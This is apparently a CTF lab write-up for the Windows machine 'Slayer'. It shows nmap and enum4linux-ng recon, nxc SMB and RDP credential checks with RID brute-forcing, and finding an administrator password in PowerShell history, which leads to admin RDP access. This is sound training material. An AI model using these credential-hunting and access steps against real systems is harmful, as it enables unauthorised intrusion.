---
title: "Hack Smarter - Windows - Easy - Slayer"
date: 2025-11-10 12:00:00 -0000
categories: [CTF, Hack Smarter]
tags: [windows, RDP, Powershell history]
---

![Hack Smarter Slayer](/assets/img/ctf/hs/easy/slayer/slayer.png))

# Initial Intel
* OS: Windows
* Difficulty: Easy
* Starting Credentials: tyler.ramsey:P@ssw0rd!

# tl;dr
<details><summary>Spoilers</summary>
* Use nxc to verify which services that were enumerated can be accessed with the given creds<br/>
* Once logged in, check PS history for anything sensitve<br/>
</details>

# Attack Path

## Recon

### Service Enumeration

This lab starts with some given credentials:

```text
tyler.ramsey:P@ssw0rd!
```

I'll add these to my typical *users.txt* and *passwords.txt* files:


Standard TCP scan to start:

```bash
┌──(haunter㉿kali)-[~/working/hs/easy/slayer/attacker]
└─$ nmap_tcp_full $slayer
...
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 126 Microsoft Windows RPC  
445/tcp   open  microsoft-ds?      syn-ack ttl 126
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 126 
```

Notable services:

#### 445/tcp - SMB

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/hs/easy/slayer]
└─$ enum4linux-ng -A $slayer 
...
[+] Found domain information via SMB
NetBIOS computer name: EC2AMAZ-M1LFCNO
NetBIOS domain name: ''                               
DNS domain: EC2AMAZ-M1LFCNO
FQDN: EC2AMAZ-M1LFCNO   
...
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '26100'
```

Let's check if the user we have can access SMB:

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/hs/easy/slayer]
└─$ nxc smb $slayer -u users.txt -p passwords.txt 

SMB         10.1.64.84      445    EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\tyler.ramsey:P@ssw0rd! 
```

Yes they can. What can we enumerate?

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/hs/easy/slayer] 
└─$ nxc smb $slayer -u users.txt -p passwords.txt -M spider_plus
...
SMB         10.1.64.84      445    EC2AMAZ-M1LFCNO  ADMIN$                          Remote Admin
SMB         10.1.64.84      445    EC2AMAZ-M1LFCNO  C$                              Default share
SMB         10.1.64.84      445    EC2AMAZ-M1LFCNO  IPC$            READ            Remote IPC

┌──(vEnv)(haunter㉿kali)-[~/working/hs/easy/slayer]
└─$ nxc smb $slayer -u users.txt -p passwords.txt --rid-brute | cut -d '\' -f 2 | cut -d " " -f 1 > users_rid.txt
...

cat users_rid.txt
...
alice.wonderland 
```


#### 3389/tcp - RDP

I'll try to RDP with the given credentials:

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/hs/easy/slayer]
└─$ nxc rdp $slayer -u users.txt -p passwords.txt  
...
RDP         10.1.64.84      3389   EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\tyler.ramsey:P@ssw0rd! (Pwn3d!)
```

Suprisingly, *tyler.ramsey* can RDP. I was sure they'd only have initial access to SMB.

```bash
┌──(haunter㉿kali)-[~/working/hs/easy/slayer]
└─$ rdp-connect /u:tyler.ramsey /p:P@ssw0rd! /v:$slayer
```

Recon'd a folder at *C:\Management* that contained a bunch of PDFs.

![Management PDfs](/assets/img/ctf/hs/easy/slayer/1.png)

![PDF Intel](/assets/img/ctf/hs/easy/slayer/2.0.png)

![PDfs 2](/assets/img/ctf/hs/easy/slayer/2.png)

Recorded a potential username. Other files seemed useless.

Checked user's context for anything useful. Looked at privileges, groups, and local files. Nothing of note. Tried to run winPEAS, but AV caught it.

Then I checked Powershell history:

```powershell
PS C:\Users\tyler.ramsey\Desktop> (Get-PSReadlineOption).HistorySavePath
C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS C:\Users\tyler.ramsey\Desktop> cat C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net user administrator "ebz0yxy3txh9BDE*yeh"
```

![PS History](/assets/img/ctf/hs/easy/slayer/3.png)

Found admin creds? Let's try them.

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/hs/easy/slayer/attacker] 
└─$ nxc rdp $slayer -u administrator -p ebz0yxy3txh9BDE*yeh 
...
RDP         10.1.64.84      3389   EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\administrator:ebz0yxy3txh9BDE*yeh (Pwn3d!)
```

![Admin Creds](/assets/img/ctf/hs/easy/slayer/4.png)

They appear to work for RDP. Let's get in:

```bash
┌──(haunter㉿kali)-[~/working/hs/easy/slayer]
└─$ rdp-connect /u:administrator /p:ebz0yxy3txh9BDE*yeh /v:$slayer
```

![Admin Login](/assets/img/ctf/hs/easy/slayer/5.png)

Got RDP access and rooted Slayer.

# Lessons Learned
* Check Powershell history

